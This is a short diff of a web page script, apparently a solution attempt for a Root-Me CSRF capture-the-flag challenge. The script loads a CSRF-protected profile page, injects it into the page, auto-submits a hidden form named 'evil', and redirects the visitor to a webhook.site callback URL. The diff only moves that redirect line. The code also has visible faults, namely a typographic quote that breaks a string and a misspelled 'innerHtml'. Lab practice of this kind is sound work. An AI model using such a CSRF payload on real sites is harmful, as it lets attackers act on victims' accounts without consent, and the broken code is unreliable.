@@ -7,12 +7,12 @@
     </form>
     <script>
       window.addEventListener('DOMContentLoaded', function () {
+        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited_v3', 4000);
         var csrfProtectedPage = ’http://challenge01.root-me.org/web-client/ch23/?action=profile’;
         var html = get(csrfProtectedPage);
         document.getElementById('drop').innerHtml = html;
         
         document.getElementById('evil').submit();
-        setTimeout(() => document.location = 'https://webhook.site/9e3a3354-6252-40c8-8b69-ab6cd26c0d44?visited', 4000);
 
         function get(url) {
           var xmlHttp = new XMLHttpRequest();
